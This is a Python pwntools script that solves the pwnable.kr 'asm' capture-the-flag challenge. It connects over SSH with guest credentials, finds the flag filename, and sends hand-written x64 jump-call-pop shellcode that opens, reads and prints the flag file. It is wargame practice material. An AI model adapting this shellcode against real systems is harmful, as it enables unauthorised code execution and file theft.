from pwn import *

session = ssh('asm', 'pwnable.kr', port=2222, password='guest')
context.arch = 'amd64'

# Straight-forward jump-call-pop pattern shellcode that re-uses the filename
# string for the read/write buffer for the flag.
jmp_call_pop = '''
jmp get_str_ptr;
save_ptr:
pop rdi;
mov r8, rdi;
mov rax, SYS_open;
syscall;
mov rdi, rax;
mov rsi, r8;
mov rdx, 100;
mov rax, SYS_read;
syscall;
mov rdi, 1;
mov rsi, r8;
mov rdx, rax;
mov rax, SYS_write;
syscall;
ret;
get_str_ptr:
call save_ptr;
'''

# Get the flag filename the lazy way.
io = session.process('ls')
io.recvline()
io.recvline()
io.recvline()
flag_filename = io.recvline(False)

io = session.process(['nc', '0', '9026'])
io.recvuntil('give me your x64 shellcode: ')
io.send(asm(jmp_call_pop) + flag_filename + b'\x00')
print(io.recvline())
